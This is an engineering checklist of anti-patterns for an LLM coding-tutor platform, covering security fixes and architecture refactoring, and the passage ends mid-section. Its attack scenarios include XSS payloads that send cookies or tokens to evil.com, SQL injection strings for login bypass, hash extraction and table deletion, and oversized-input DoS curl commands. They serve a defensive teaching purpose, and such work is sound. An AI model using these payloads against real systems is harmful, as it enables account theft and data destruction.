# Anti-Patterns Checklist
# LLM Coding Tutor Platform (CodeMentor)

**Document Version:** 1.0
**Date:** 2025-12-06
**Purpose:** Prevent common mistakes and guide future development

---

## Table of Contents

1. [Critical Anti-Patterns (P0)](#1-critical-anti-patterns-p0)
2. [High-Priority Anti-Patterns (P1)](#2-high-priority-anti-patterns-p1)
3. [Medium-Priority Anti-Patterns (P2)](#3-medium-priority-anti-patterns-p2)
4. [Architectural Anti-Patterns](#4-architectural-anti-patterns)
5. [Security Anti-Patterns](#5-security-anti-patterns)
6. [Performance Anti-Patterns](#6-performance-anti-patterns)
7. [Testing Anti-Patterns](#7-testing-anti-patterns)
8. [Code Quality Anti-Patterns](#8-code-quality-anti-patterns)

---

## 1. Critical Anti-Patterns (P0)

### AP-CRIT-001: Hardcoded Configuration Values

**Status:** ✅ FIXED (SEC-1 work stream - 2025-12-06)

**Description:** URLs, secrets, and configuration hardcoded in source code instead of loaded from environment variables.

**Example (BEFORE - DON'T DO THIS):**
```python
# backend/src/services/oauth_service.py (OLD)
redirect_uri = "http://localhost:3000/oauth/callback"  # WRONG!
```

**Why It's Bad:**
- Cannot deploy to different environments (dev, staging, prod)
- Secrets exposed in source code
- Requires code changes for configuration updates
- Security vulnerability if committed to git

**Correct Pattern (AFTER - SEC-1):**
```python
# backend/src/services/oauth_service.py (NEW)
from src.config import settings

redirect_uri = f"{settings.frontend_url}/oauth/callback"  # CORRECT!
```

**Detection:**
```bash
# Search for hardcoded URLs
grep -r "http://localhost" backend/src/
grep -r "https://.*\.com" backend/src/ | grep -v settings
```

**Prevention:**
- Use `settings.py` for all configuration
- Add to pre-commit hooks: check for hardcoded URLs
- Code review checklist: "All URLs from settings?"

---

### AP-CRIT-002: OAuth Token Exposure in URL Parameters

**Status:** ✅ FIXED (SEC-1 work stream - 2025-12-06)

**Description:** OAuth access tokens returned in URL parameters, exposing them to browser history, logs, and referrer headers.

**Example (BEFORE - DON'T DO THIS):**
```python
# backend/src/api/auth.py (OLD)
@auth_bp.route("/oauth/callback/github")
async def github_callback():
    access_token = await oauth_service.exchange_code(code)
    # WRONG! Token in URL
    return redirect(f"{frontend_url}/oauth/success?token={access_token}")
```

**Why It's Bad:**
- Tokens logged in web server access logs
- Tokens in browser history (unencrypted disk storage)
- Tokens leaked via Referer header to third-party sites
- Cannot be revoked (no httpOnly cookie protection)
- XSS attacks can steal tokens from URL

**Attack Scenario:**
```
1. User clicks "Login with GitHub"
2. Redirected to: app.com/oauth/success?token=ghu_ABC123...
3. Token now in browser history (unencrypted)
4. Attacker with access to disk can steal token
5. Token also in web server logs: access.log
6. User clicks external link → token sent in Referer header
```

**Correct Pattern (AFTER - SEC-1):**
```python
# backend/src/api/auth.py (NEW)
@auth_bp.route("/oauth/callback/github")
async def github_callback():
    access_token = await oauth_service.exchange_code(code)

    # Step 1: Generate short-lived auth code (not token!)
    auth_code = secrets.token_urlsafe(32)
    await redis.setex(f"oauth_code:{auth_code}", 300, access_token)  # 5 min

    # Step 2: Redirect with auth code (not token)
    return redirect(f"{frontend_url}/oauth/success?code={auth_code}")

@auth_bp.route("/oauth/exchange")
async def exchange_auth_code():
    code = request.json.get("code")
    access_token = await redis.get(f"oauth_code:{code}")
    await redis.delete(f"oauth_code:{code}")  # Single use

    # Step 3: Set token in httpOnly cookie
    response = jsonify({"success": True})
    response.set_cookie(
        "access_token",
        value=access_token,
        httponly=True,      # JavaScript can't access
        secure=True,        # HTTPS only
        samesite="strict",  # CSRF protection
        max_age=86400       # 24 hours
    )
    return response
```

**Detection:**
```bash
# Search for token/secret in URL redirects
grep -r "redirect.*token" backend/src/
grep -r "redirect.*secret" backend/src/
grep -r "redirect.*key" backend/src/
```

**Prevention:**
- Use authorization code flow (OAuth 2.0 standard)
- Never put tokens in URLs, query parameters, or fragments
- Always use httpOnly cookies for tokens
- Code review: "Are tokens ever in URLs?"

---

### AP-CRIT-003: Password Reset Without Session Invalidation

**Status:** ✅ VERIFIED (Already implemented in AuthService - 2025-12-06)

**Description:** Password reset endpoint doesn't invalidate all existing sessions, leaving user vulnerable if password was compromised.

**Example (DON'T DO THIS):**
```python
# WRONG! Sessions still valid after password reset
async def reset_password(user_id: int, new_password: str):
    hashed = bcrypt.hashpw(new_password.encode(), bcrypt.gensalt())
    await db.execute(
        update(User).where(User.id == user_id).values(password_hash=hashed)
    )
    # ISSUE: Old sessions still work!
```

**Why It's Bad:**
- Attacker who stole old password still has access
- Active sessions continue to work with compromised password
- User believes they're secure after reset

**Attack Scenario:**
```
1. Attacker steals user password
2. Attacker logs in, gets JWT token
3. User notices breach, resets password
4. Attacker's JWT token STILL VALID
5. Attacker continues accessing account
```

**Correct Pattern (CURRENT - Already Implemented):**
```python
# backend/src/services/auth_service.py (CORRECT - Already implemented)
@staticmethod
async def reset_password(user_id: int, new_password: str):
    # 1. Hash new password
    hashed = bcrypt.hashpw(new_password.encode(), bcrypt.gensalt())

    # 2. Update password in database
    async with get_async_db_session() as session:
        await session.execute(
            update(User).where(User.id == user_id).values(password_hash=hashed)
        )
        await session.commit()

    # 3. Invalidate ALL user sessions (CRITICAL!)
    await AuthService.invalidate_all_user_sessions(user_id)

    logger.info(
        "Password reset complete, all sessions invalidated",
        extra={"user_id": user_id}
    )

@staticmethod
async def invalidate_all_user_sessions(user_id: int):
    """Invalidate all active sessions for a user (already implemented)."""
    redis_client = get_redis()

    # Get all session JTIs for this user
    session_set_key = f"user_sessions:{user_id}"
    session_jtis = redis_client.smembers(session_set_key)

    # Add each JTI to blacklist
    for jti in session_jtis:
        redis_client.setex(
            f"blacklist:{jti}",
            86400,  # 24 hours (token expiry)
            "1"
        )

    # Clear session set
    redis_client.delete(session_set_key)
```

**Detection:**
```bash
# Search for password reset without invalidation
grep -A 10 "reset_password" backend/src/ | grep -L "invalidate"
```

**Prevention:**
- Always call `invalidate_all_user_sessions()` after password change
- Store session JTIs in Redis set keyed by user_id
- Maintain blacklist of invalidated JTIs
- Test: "After password reset, can old JWT still access API?"

---

### AP-CRIT-004: Secrets Exposed in Git Repository

**Status:** ✅ FIXED (SEC-2-GIT work stream - 2025-12-06)

**Description:** `.env` files, API keys, or other secrets tracked in git history.

**Example (BEFORE - DON'T DO THIS):**
```bash
# Git history showing secrets (OLD)
$ git log --all -- frontend/.env.production
commit 7ab7fe7
    Add production environment file  # WRONG! Contains production IP
```

**Why It's Bad:**
- Secrets visible in git history forever
- Anyone with repository access can see secrets
- Leaked secrets cannot be "un-leaked"
- Production credentials exposed to all developers

**Incident (2025-12-06):**
```
File: frontend/.env.production
Content: VITE_API_BASE_URL=http://35.209.246.229:5000
Status: Tracked in git for 52 commits
Impact: Production IP exposed in public repository
```

**Correct Pattern (AFTER - SEC-2-GIT):**
```bash
# 1. Remove from git tracking
git rm --cached frontend/.env.production

# 2. Add to .gitignore
echo "frontend/.env.production" >> .gitignore
echo "frontend/.env.development" >> .gitignore
echo "frontend/.env.local" >> .gitignore
echo "backend/.env" >> .gitignore

# 3. Remove from git history
git filter-branch --index-filter \
  'git rm --cached --ignore-unmatch frontend/.env.production' \
  HEAD

# 4. Create template file
cp frontend/.env.production frontend/.env.production.example
# Replace real values with placeholders
sed -i 's/35.209.246.229/YOUR_PRODUCTION_IP_HERE/g' \
  frontend/.env.production.example

# 5. Commit .gitignore and .example file
git add .gitignore frontend/.env.production.example
git commit -m "Remove secrets from git, add template"
```

**Detection:**
```bash
# Scan git history for secrets
git log --all --pretty=format: --name-only | sort -u | grep -E '\\.env$'
git log --all --pretty=format: --name-only | sort -u | grep -E 'secret|key|password'

# Scan current files
find . -name ".env*" ! -name ".env.example" -type f
```

**Prevention:**
- `.gitignore` BEFORE first commit
- Pre-commit hooks to block secrets
- Use `.env.example` templates only
- Regular git history audits
- Secret scanning tools (TruffleHog, git-secrets)

**Pre-commit Hook (SEC-2):**
```yaml
# .pre-commit-config.yaml (IMPLEMENTED)
repos:
  - repo: local
    hooks:
      - id: check-env-files
        name: Check for .env files
        entry: bash -c 'if git diff --cached --name-only | grep -E "\.env$" | grep -v example; then echo "ERROR: .env file in commit!"; exit 1; fi'
        language: system
        pass_filenames: false
```

---

## 2. High-Priority Anti-Patterns (P1)

### AP-SEC-001: Token Storage in localStorage

**Status:** ✅ FIXED (SEC-1-FE work stream - 2025-12-06)

**Description:** JWT tokens stored in browser localStorage, vulnerable to XSS attacks.

**Example (BEFORE - DON'T DO THIS):**
```typescript
// frontend/src/services/authService.ts (OLD)
export const saveTokens = (access: string, refresh: string) => {
    localStorage.setItem('access_token', access);  // WRONG! XSS vulnerable
    localStorage.setItem('refresh_token', refresh);
};

export const getAccessToken = () => {
    return localStorage.getItem('access_token');  // WRONG!
};
```

**Why It's Bad:**
- XSS attacks can steal tokens via JavaScript
- Any third-party script can access localStorage
- Tokens persist across browser sessions (not cleared on close)

**XSS Attack Scenario:**
```javascript
// Attacker injects malicious script:
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: localStorage.getItem('access_token')  // STOLEN!
    })
  });
</script>
```

**Correct Pattern (AFTER - SEC-1-FE):**
```typescript
// frontend/src/services/api.ts (NEW)
import axios from 'axios';

export const apiClient = axios.create({
    baseURL: import.meta.env.VITE_API_BASE_URL,
    withCredentials: true,  // CORRECT! Send cookies automatically
    headers: {
        'Content-Type': 'application/json',
    },
});

// NO manual token management needed!
// Cookies sent automatically on every request
```

```python
# backend/src/api/auth.py (NEW)
@auth_bp.route("/login", methods=["POST"])
async def login():
    # ... verify credentials ...

    # Generate JWT
    access_token = AuthService.create_jwt_token(...)

    # Set in httpOnly cookie (JavaScript can't access)
    response = jsonify({"success": True})
    response.set_cookie(
        "access_token",
        value=access_token,
        httponly=True,      # XSS protection
        secure=True,        # HTTPS only
        samesite="strict",  # CSRF protection
        max_age=86400       # 24 hours
    )
    return response
```

**Migration Steps (SEC-1-FE):**
1. ✅ Backend: Set tokens in httpOnly cookies
2. ✅ Frontend: Enable `withCredentials: true`
3. ✅ Frontend: Remove `localStorage.setItem/getItem` calls
4. ✅ Frontend: Remove Authorization header injection
5. ✅ Frontend: Update Redux authSlice (remove token field)
6. ✅ Testing: Verify authentication still works

**Detection:**
```bash
# Search for localStorage token usage
grep -r "localStorage.*token" frontend/src/
grep -r "sessionStorage.*token" frontend/src/
```

**Prevention:**
- Always use httpOnly cookies for auth tokens
- Never store sensitive data in localStorage/sessionStorage
- Code review: "Any localStorage usage for auth?"
- Security training: "localStorage is not secure storage"

---

### AP-SEC-002: Input Validation Inconsistent

**Status:** ✅ FIXED (SEC-3-INPUT work stream - 2025-12-06)

**Description:** Some endpoints validate input with Pydantic, others don't. Inconsistent maximum lengths.

**Example (BEFORE - Mixed Validation):**
```python
# WRONG! No validation
@auth_bp.route("/register", methods=["POST"])
async def register():
    data = await request.get_json()  # No schema!
    email = data.get("email")  # Could be 1MB string!
    password = data.get("password")  # No length check!
```

**Why It's Bad:**
- DoS attacks via oversized input
- SQL injection if input not sanitized
- XSS if output not escaped
- Inconsistent error messages

**Attack Scenarios:**

**1. DoS via Oversized Input:**
```bash
curl -X POST /api/auth/register \
  -d '{"email": "'$(python -c 'print("a"*10000000)')'@test.com"}'
# 10MB email crashes server (out of memory)
```

**2. XSS via Unsanitized Markdown:**
```bash
curl -X POST /api/users/me \
  -d '{"bio": "<script>alert(document.cookie)</script>"}'
# Stored XSS when bio displayed
```

**Correct Pattern (AFTER - SEC-3-INPUT):**
```python
# backend/src/schemas/auth.py (NEW)
from pydantic import BaseModel, EmailStr, field_validator, Field

class RegisterRequest(BaseModel):
    """Registration request with validation."""
    email: EmailStr = Field(..., max_length=255)
    password: str = Field(..., min_length=12, max_length=128)
    name: str = Field(..., min_length=1, max_length=100)

    @field_validator("password")
    @classmethod
    def validate_password_strength(cls, value: str) -> str:
        """Validate password meets strength requirements."""
        if not any(c.isupper() for c in value):
            raise ValueError("Password must contain uppercase letter")
        if not any(c.islower() for c in value):
            raise ValueError("Password must contain lowercase letter")
        if not any(c.isdigit() for c in value):
            raise ValueError("Password must contain digit")
        return value

# backend/src/api/auth.py (NEW)
from src.schemas.auth import RegisterRequest

@auth_bp.route("/register", methods=["POST"])
async def register():
    data = await request.get_json()

    # Validate with Pydantic schema
    try:
        validated = RegisterRequest(**data)
    except ValidationError as e:
        raise APIError(
            "Invalid input",
            status_code=400,
            details=e.errors()
        )

    # Use validated data (guaranteed safe)
    user = await auth_service.register(
        email=validated.email,
        password=validated.password,
        name=validated.name
    )
```

**Markdown Sanitization (SEC-3-INPUT):**
```python
# backend/src/utils/sanitization.py (NEW)
import bleach

ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li']
ALLOWED_ATTRIBUTES = {}

def sanitize_markdown(text: str, max_length: int = 5000) -> str:
    """
    Sanitize markdown text to prevent XSS.

    Args:
        text: Raw markdown text
        max_length: Maximum allowed length

    Returns:
        Sanitized HTML-safe text

    Raises:
        ValueError: If text exceeds max_length
    """
    if len(text) > max_length:
        raise ValueError(f"Text exceeds maximum length of {max_length}")

    # Convert markdown to HTML
    html = markdown.markdown(text)

    # Sanitize HTML (remove dangerous tags/attributes)
    clean_html = bleach.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True
    )

    return clean_html
```

**Detection:**
```bash
# Find endpoints without Pydantic schemas
grep -r "request.get_json()" backend/src/api/ | \
  grep -v "validate\|schema\|Schema"

# Find fields without max_length
grep -r "Field(" backend/src/schemas/ | grep -v "max_length"
```

**Prevention:**
- Pydantic schema for EVERY request body
- Maximum length on EVERY text field
- Sanitize all user-generated content (markdown, HTML)
- Input validation checklist in PR template
- Automated security testing (OWASP ZAP)

**Maximum Length Guidelines (SEC-3-INPUT):**
```python
# Enforced limits
MAX_EMAIL_LENGTH = 255
MAX_PASSWORD_LENGTH = 128
MAX_NAME_LENGTH = 100
MAX_BIO_LENGTH = 2000
MAX_CHAT_MESSAGE_LENGTH = 5000
MAX_EXERCISE_SOLUTION_LENGTH = 50000  # 50KB
```

---

### AP-SEC-003: XSS Protection Missing

**Status:** ✅ FIXED (SEC-3-INPUT work stream - 2025-12-06)

**Description:** User-generated content not sanitized before display, allowing XSS attacks.

**Example (BEFORE - DON'T DO THIS):**
```typescript
// frontend/src/components/Chat/ChatMessage.tsx (OLD)
const ChatMessage = ({ message }: Props) => {
    return (
        <div dangerouslySetInnerHTML={{ __html: message.content }} />  // WRONG!
    );
};
```

**Why It's Bad:**
- Attackers inject malicious scripts
- Scripts execute in victim's browser
- Can steal cookies, tokens, session data
- Can modify page content, redirect users

**Attack Scenario:**
```javascript
// Attacker sends chat message:
message.content = `
    <img src="x" onerror="
        fetch('https://evil.com/steal', {
            method: 'POST',
            body: document.cookie  // STOLEN!
        })
    ">
`;

// Victim views message → script executes → cookies stolen
```

**Correct Pattern (AFTER - SEC-3-INPUT):**
```typescript
// frontend/src/components/Chat/ChatMessage.tsx (NEW)
import ReactMarkdown from 'react-markdown';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';

const ChatMessage = ({ message }: Props) => {
    return (
        <ReactMarkdown
            components={{
                code({ node, inline, className, children, ...props }) {
                    const match = /language-(\w+)/.exec(className || '');
                    return !inline && match ? (
                        <SyntaxHighlighter language={match[1]} PreTag="div">
                            {String(children).replace(/\n$/, '')}
                        </SyntaxHighlighter>
                    ) : (
                        <code className={className} {...props}>
                            {children}
                        </code>
                    );
                }
            }}
        >
            {message.content}  {/* SAFE! ReactMarkdown sanitizes */}
        </ReactMarkdown>
    );
};
```

```python
# backend/src/utils/sanitization.py (NEW)
import html

def escape_html(text: str) -> str:
    """
    Escape HTML special characters to prevent XSS.

    Converts: < > & " ' to HTML entities

    Args:
        text: Raw text that may contain HTML

    Returns:
        HTML-escaped text safe for display
    """
    return html.escape(text)

# Usage in API responses
@users_bp.route("/me", methods=["GET"])
async def get_profile():
    user = await profile_service.get_user(user_id)

    return jsonify({
        "name": escape_html(user.name),      # SAFE!
        "bio": escape_html(user.bio),        # SAFE!
        "email": user.email  # Email already validated, no escaping needed
    })
```

**Detection:**
```bash
# Find dangerouslySetInnerHTML usage
grep -r "dangerouslySetInnerHTML" frontend/src/

# Find innerHTML usage
grep -r "\.innerHTML" frontend/src/

# Find unescaped output
grep -r "{{.*}}" frontend/src/ | grep -v "| safe"
```

**Prevention:**
- Use React (auto-escapes by default)
- Use ReactMarkdown for markdown (auto-sanitizes)
- Use SyntaxHighlighter for code blocks
- Backend: `html.escape()` all user content
- Backend: `bleach.clean()` for markdown
- Never use `dangerouslySetInnerHTML` without sanitization
- Content Security Policy headers

---

### AP-SEC-004: SQL Injection Prevention Missing

**Status:** ✅ VERIFIED (SQLAlchemy prevents this by design)

**Description:** Raw SQL queries without parameterization, allowing SQL injection attacks.

**Example (DON'T DO THIS - We don't do this):**
```python
# WRONG! SQL injection vulnerability
async def get_user_by_email(email: str):
    query = f"SELECT * FROM users WHERE email = '{email}'"  # DANGEROUS!
    result = await db.execute(query)
    return result.fetchone()

# Attack:
email = "admin@test.com' OR '1'='1"
# Resulting query: SELECT * FROM users WHERE email = 'admin@test.com' OR '1'='1'
# Returns ALL users!
```

**Attack Scenarios:**

**1. Authentication Bypass:**
```python
email = "admin@test.com' OR '1'='1' --"
password = "anything"
# Query: SELECT * FROM users WHERE email = 'admin@test.com' OR '1'='1' --' AND password = ...
# The -- comments out password check, bypassing authentication
```

**2. Data Exfiltration:**
```python
search = "test' UNION SELECT id, password_hash, email FROM users --"
# Extracts all password hashes
```

**3. Data Modification:**
```python
user_id = "1; DROP TABLE users; --"
# Deletes entire users table
```

**Correct Pattern (CURRENT - We already do this):**
```python
# backend/src/services/auth_service.py (CORRECT - Already using this)
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

async def get_user_by_email(email: str, session: AsyncSession):
    # SAFE! SQLAlchemy uses parameterized queries
    stmt = select(User).where(User.email == email)
    result = await session.execute(stmt)
    return result.scalar_one_or_none()
```

**Why SQLAlchemy is Safe:**
```python
# SQLAlchemy generates:
# SELECT * FROM users WHERE email = $1
# Parameters: ['admin@test.com']
# Database driver properly escapes the parameter, preventing injection
```

**Detection:**
```bash
# Search for string interpolation in SQL
grep -r "f\".*SELECT" backend/src/
grep -r "f\".*INSERT" backend/src/
grep -r "f\".*UPDATE" backend/src/
grep -r "f\".*DELETE" backend/src/

# Search for raw SQL execution
grep -r "execute(\"" backend/src/
grep -r "execute(f\"" backend/src/
```

**Prevention:**
- Always use SQLAlchemy ORM or Core (parameterized queries)
- Never use f-strings in SQL queries
- If raw SQL needed, use parameterized queries with `text()`:

```python
from sqlalchemy import text

# If you MUST use raw SQL, do this:
stmt = text("SELECT * FROM users WHERE email = :email")
result = await session.execute(stmt, {"email": email})  # SAFE!
```

- Code review: "Any f-strings in SQL?"
- Static analysis: `bandit` to detect SQL injection

---

### AP-SEC-005: DoS via Oversized Inputs

**Status:** ✅ FIXED (SEC-3-INPUT work stream - 2025-12-06)

**Description:** No maximum size limits on request bodies, allowing DoS attacks.

**Example (BEFORE - DON'T DO THIS):**
```python
# WRONG! No size limit
@exercises_bp.route("/<int:exercise_id>/submit", methods=["POST"])
async def submit_solution(exercise_id):
    data = await request.get_json()  # Could be 1GB!
    solution = data.get("solution")  # Crashes server
```

**Attack Scenario:**
```bash
# Send 100MB solution
curl -X POST /api/exercises/1/submit \
  -H "Content-Type: application/json" \
  -d '{"solution": "'$(python -c 'print("A"*100000000)')'"}' \
  # Server runs out of memory, crashes
```

**Impact:**
- Server memory exhaustion
- CPU exhaustion (parsing large JSON)
- Disk exhaustion (if logged)
- Service unavailable for legitimate users

**Correct Pattern (AFTER - SEC-3-INPUT):**
```python
# backend/src/middleware/security_headers.py (IMPLEMENTED)
def add_request_size_limit(app: Quart, max_size: int = 16 * 1024 * 1024):
    """
    Add request size limit middleware.

    Args:
        app: Quart application
        max_size: Maximum request size in bytes (default: 16MB)
    """
    @app.before_request
    async def check_request_size():
        content_length = request.headers.get('Content-Length', type=int)

        if content_length and content_length > max_size:
            raise APIError(
                f"Request too large. Maximum size: {max_size / 1024 / 1024}MB",
                status_code=413  # Payload Too Large
            )

# backend/src/schemas/exercise.py (IMPLEMENTED)
from pydantic import BaseModel, Field

class ExerciseSubmissionRequest(BaseModel):
    """Exercise solution submission with size limits."""
    solution: str = Field(
        ...,
        min_length=1,
        max_length=50000,  # 50KB maximum
        description="Exercise solution code"
    )
    language: str = Field(
        ...,
        max_length=20,
        description="Programming language"
    )
```

**Size Limits Implemented (SEC-3-INPUT):**
```python
# Maximum sizes for different content types
MAX_REQUEST_SIZE = 16 * 1024 * 1024      # 16MB (entire request)
MAX_EXERCISE_SOLUTION = 50 * 1024       # 50KB (code solution)
MAX_CHAT_MESSAGE = 5 * 1024             # 5KB (chat message)
MAX_PROFILE_BIO = 2 * 1024              # 2KB (bio text)
MAX_FILE_UPLOAD = 10 * 1024 * 1024      # 10MB (future file uploads)
```

**Detection:**
```bash
# Find endpoints without size limits
grep -r "request.get_json()" backend/src/api/ | \
  while read file; do
    if ! grep -q "max_length\|Field(" "$file"; then
      echo "No size limit: $file"
    fi
  done
```

**Prevention:**
- Global request size limit in middleware (16MB)
- Field-level `max_length` in every Pydantic schema
- Reject requests with `Content-Length` > limit BEFORE parsing
- Rate limiting to prevent repeated attacks
- Monitoring: Alert on 413 (Payload Too Large) responses

---

## 3. Medium-Priority Anti-Patterns (P2)

### AP-ARCH-001: God Objects

**Status:** ⚠️ PRESENT (needs refactoring)

**Description:** Classes/modules with too many responsibilities, violating Single Responsibility Principle.

**Example:**
```python
# backend/src/services/llm/llm_service.py (325 lines!)
class LLMService:
    # Too many responsibilities:
    def generate_exercise(self):         # Exercise generation
    def generate_hint(self):             # Hint generation
    def evaluate_solution(self):         # Code evaluation
    def chat_response(self):             # Chat responses
    def stream_response(self):           # Streaming
    def handle_provider_fallback(self):  # Provider failover
    def track_cost(self):                # Cost tracking
    def cache_response(self):            # Caching
    # ... 20+ more methods
```

**Why It's Bad:**
- Hard to understand (too much cognitive load)
- Hard to test (too many dependencies)
- Hard to maintain (changes affect many features)
- Violates SOLID principles

**Correct Pattern:**
```python
# Split into focused services:

# services/llm/generation_service.py
class ExerciseGenerationService:
    """Handles exercise generation only."""
    def generate_exercise(self, user_id, difficulty):
        ...

    def generate_hint(self, exercise_id):
        ...

# services/llm/evaluation_service.py
class CodeEvaluationService:
    """Handles code evaluation only."""
    def evaluate_solution(self, solution, test_cases):
        ...

    def generate_feedback(self, evaluation_result):
        ...

# services/llm/chat_service.py
class ChatService:
    """Handles chat interactions only."""
    def generate_response(self, conversation_history):
        ...

    def stream_response(self, prompt):
        ...

# services/llm/provider_manager.py
class LLMProviderManager:
    """Handles provider selection and fallback."""
    def get_provider(self, primary, fallback):
        ...

    def handle_provider_failure(self, error):
        ...
```

**Detection:**
```bash
# Find large files (>300 lines)
find backend/src -name "*.py" -exec wc -l {} + | \
  awk '$1 > 300 {print $2, $1}' | \
  sort -k2 -nr

# Find classes with many methods (>15)
grep -r "def " backend/src/services/ | \
  cut -d: -f1 | uniq -c | \
  awk '$1 > 15 {print $1, $2}'
```

**Prevention:**
- Single Responsibility Principle: each class has ONE job
- If class name has "and" in it, split it
- If class >200 lines, consider splitting
- Code review: "Does this class do too much?"

---

### AP-ARCH-002: Tight Coupling via Direct Instantiation

**Status:** ⚠️ PRESENT (needs dependency injection)

**Description:** Services instantiate dependencies directly, creating tight coupling and making testing difficult.

**Example:**
```python
# backend/src/services/exercise_service.py (CURRENT)
class ExerciseService:
    @staticmethod
    async def generate_exercise(user_id: int):
        # ISSUE: Direct instantiation = tight coupling
        llm_service = LLMService()
        profile_service = ProfileService()
        difficulty_service = DifficultyService()

        # Now stuck with concrete implementations
        profile = await profile_service.get_profile(user_id)
        difficulty = await difficulty_service.calculate(user_id)
        exercise = await llm_service.generate(profile, difficulty)
```

**Why It's Bad:**
- Cannot swap implementations (no polymorphism)
- Cannot mock dependencies in tests
- Hard to test in isolation
- Creates hidden dependencies

**Correct Pattern (Dependency Injection):**
```python
# services/exercise_service.py (BETTER)
class ExerciseService:
    def __init__(
        self,
        llm_service: LLMService,
        profile_service: ProfileService,
        difficulty_service: DifficultyService
    ):
        """Inject dependencies instead of creating them."""
        self.llm_service = llm_service
        self.profile_service = profile_service
        self.difficulty_service = difficulty_service

    async def generate_exercise(self, user_id: int):
        # Use injected dependencies
        profile = await self.profile_service.get_profile(user_id)
        difficulty = await self.difficulty_service.calculate(user_id)
        exercise = await self.llm_service.generate(profile, difficulty)

# api/exercises.py (BETTER)
@exercises_bp.route("/daily", methods=["GET"])
async def get_daily_exercise():
    # Create service with dependencies
    exercise_service = ExerciseService(
        llm_service=LLMService(),
        profile_service=ProfileService(),
        difficulty_service=DifficultyService()
    )

    exercise = await exercise_service.generate_exercise(g.user_id)
    return jsonify(exercise)

# tests/test_exercise_service.py (NOW TESTABLE!)
async def test_generate_exercise():
    # Mock dependencies
    mock_llm = MagicMock(spec=LLMService)
    mock_profile = MagicMock(spec=ProfileService)
    mock_difficulty = MagicMock(spec=DifficultyService)

    # Inject mocks
    service = ExerciseService(
        llm_service=mock_llm,
        profile_service=mock_profile,
        difficulty_service=mock_difficulty
    )

    # Test in isolation!
    result = await service.generate_exercise(user_id=1)
```

**Advanced Pattern (Dependency Injection Container):**
```python
# utils/container.py (FUTURE)
from dependency_injector import containers, providers

class Container(containers.DeclarativeContainer):
    """Dependency injection container."""

    # Infrastructure
    config = providers.Configuration()
    database = providers.Singleton(DatabaseManager, config.database_url)
    redis = providers.Singleton(RedisManager, config.redis_url)

    # Services
    llm_service = providers.Factory(LLMService, config=config)
    profile_service = providers.Factory(ProfileService, db=database)
    difficulty_service = providers.Factory(DifficultyService, db=database)

    # Exercise service with auto-injected dependencies
    exercise_service = providers.Factory(
        ExerciseService,
        llm_service=llm_service,
        profile_service=profile_service,
        difficulty_service=difficulty_service
    )

# api/exercises.py (FUTURE)
from src.utils.container import Container

container = Container()

@exercises_bp.route("/daily", methods=["GET"])
async def get_daily_exercise():
    # Get service from container (dependencies auto-injected!)
    exercise_service = container.exercise_service()
    exercise = await exercise_service.generate_exercise(g.user_id)
    return jsonify(exercise)
```

**Detection:**
```bash
# Find direct instantiation in services
grep -r "Service()" backend/src/services/ | grep -v "test_"
```

**Prevention:**
- Use dependency injection pattern
- Constructor injection (preferred)
- Property injection (for optional deps)
- Future: Dependency injection container

---

### AP-ARCH-003: Missing Repository Pattern

**Status:** ⚠️ PRESENT (services directly use SQLAlchemy)

**Description:** Services directly use SQLAlchemy queries, mixing business logic with data access.

**Example (CURRENT):**
```python
# services/exercise_service.py (CURRENT)
async def get_user_exercises(user_id: int):
    async with get_async_db_session() as session:
        # ISSUE: Data access logic in service layer
        stmt = (
            select(UserExercise)
            .where(UserExercise.user_id == user_id)
            .order_by(UserExercise.created_at.desc())
            .limit(10)
        )
        result = await session.execute(stmt)
        return result.scalars().all()
```

**Why It's Bad:**
- Data access logic duplicated across services
- Hard to change database structure (affects many services)
- No abstraction between business logic and data access
- Difficult to swap database implementation

**Correct Pattern (Repository Pattern):**
```python
# repositories/user_exercise_repository.py (BETTER)
class UserExerciseRepository:
    """Data access layer for UserExercise."""

    def __init__(self, session: AsyncSession):
        self.session = session

    async def find_by_user(
        self,
        user_id: int,
        limit: int = 10,
        offset: int = 0
    ) -> List[UserExercise]:
        """Get user exercises with pagination."""
        stmt = (
            select(UserExercise)
            .where(UserExercise.user_id == user_id)
            .order_by(UserExercise.created_at.desc())
            .limit(limit)
            .offset(offset)
        )
        result = await self.session.execute(stmt)
        return result.scalars().all()

    async def find_by_id(self, exercise_id: int) -> Optional[UserExercise]:
        """Get exercise by ID."""
        stmt = select(UserExercise).where(UserExercise.id == exercise_id)
        result = await self.session.execute(stmt)
        return result.scalar_one_or_none()

    async def create(self, user_exercise: UserExercise) -> UserExercise:
        """Create new user exercise."""
        self.session.add(user_exercise)
        await self.session.flush()
        return user_exercise

    async def update(self, user_exercise: UserExercise) -> UserExercise:
        """Update existing user exercise."""
        await self.session.flush()
        return user_exercise

# services/exercise_service.py (BETTER)
class ExerciseService:
    def __init__(self, user_exercise_repo: UserExerciseRepository):
        self.user_exercise_repo = user_exercise_repo

    async def get_user_exercises(
        self,
        user_id: int,
        page: int = 1,
        page_size: int = 10
    ):
        # Business logic only, no SQL!
        offset = (page - 1) * page_size
        exercises = await self.user_exercise_repo.find_by_user(
            user_id=user_id,
            limit=page_size,
            offset=offset
        )

        # Business logic: format results
        return [
            self._format_exercise(ex) for ex in exercises
        ]
```

**Benefits:**
- Single place to change queries (repository)
- Easy to add caching (in repository)
- Easy to swap database (new repository implementation)
- Service layer focuses on business logic only

**Detection:**
```bash
# Find direct SQLAlchemy usage in services
grep -r "select(" backend/src/services/
grep -r "insert(" backend/src/services/
grep -r "update(" backend/src/services/
grep -r "delete(" backend/src/services/
```

**Prevention:**
- Create repository for each model
- Services only call repository methods
- No SQL in services (business logic only)
- Code review: "Should this be in a repository?"

---

### AP-ARCH-004: Dual Database Engines

**Status:** ✅ FIXED (DB-OPT work stream - 2025-12-06)

**Description:** Both sync and async database engines active, wasting connection pool.

**Example (BEFORE - DON'T DO THIS):**
```python
# backend/src/utils/database.py (OLD)
class DatabaseManager:
    def __init__(self, database_url):
        # WRONG! Two engines = double connections
        self._sync_engine = create_engine(database_url, pool_size=20)
        self._async_engine = create_async_engine(database_url, pool_size=20)
        # Total: 40 connections (20 sync + 20 async)
```

**Why It's Bad:**
- Wastes connection pool (50% more connections)
- Slows down deployment (more connections to drain)
- Costs more (connection overhead)
- Only async needed (Quart is async)

**Impact at 10,000 Users:**
